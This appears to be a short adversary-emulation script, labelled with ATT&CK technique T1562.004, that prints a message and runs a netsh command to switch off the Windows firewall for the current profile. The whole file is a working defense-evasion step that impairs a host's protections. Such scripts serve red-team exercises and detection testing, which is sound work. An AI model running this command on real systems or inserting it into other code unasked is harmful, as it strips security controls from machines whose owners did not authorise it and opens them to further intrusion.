## Author: lehag
## Code: T1562-004-DisableSystemFirewall.py
"""
	Description:
		It disables the system firewall.
"""
import subprocess
import sys

if __name__ == "__main__":
	print("[+] Disabling the system firewall.");

	## Disables the system firewall
	result = subprocess.run(["netsh", "advfirewall", "set", "currentprofile", "state", "off"]);
